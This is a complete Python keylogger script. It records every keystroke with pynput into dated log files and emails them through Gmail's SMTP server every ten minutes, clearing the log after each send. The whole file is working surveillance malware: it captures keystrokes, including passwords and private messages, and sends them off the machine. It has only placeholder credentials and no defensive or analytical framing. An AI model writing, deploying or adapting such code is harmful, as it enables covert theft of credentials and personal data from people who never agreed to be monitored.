import logging
import os
import smtplib
import time
import schedule
from pynput import keyboard
from datetime import datetime
from threading import Thread

#Email Config
EMAIL_ADDRESS = "example@gmail.com"
EMAIL_PASSWORD = "enter your app password"
SEND_INTERVAL = 10
LOG_DIR = "logs"

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def getLogFileName():
    return os.path.join(LOG_DIR, f"keylog_{datetime.now().strftime('%Y-%m-%d')}.txt")

logging.basicConfig(
    filename=getLogFileName(),
    level = logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

def onPress(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")

def sendLogs():
    filepath = getLogFileName()

    if not os.path.exists(filepath):
        return

    with open(filepath, "r") as file:
        logData = file.read()
    
    if logData.strip() == "":
        return
    
    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        subject = "Keylogger logs"
        message = f"Subject: {subject}\n\n{logData}"
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message)
        server.quit()

        print(f"[+] Logs sent to {EMAIL_ADDRESS}")

        open(filepath, "w").close()
    
    except Exception as e:
        print(f"[!] Failed to send logs: {e}")

def runScheduler():
    schedule.every(SEND_INTERVAL).minutes.do(sendLogs)
    while True:
        schedule.run_pending()
        time.sleep(1)

def startKeylogger():
    Thread(target=runScheduler, daemon=True).start()

    try:
        with keyboard.Listener(on_press=onPress) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[!]Keylogger stopped by user (CTRL + C). Exiting.....")
        exit(0)

if __name__ == "__main__":
    startKeylogger()
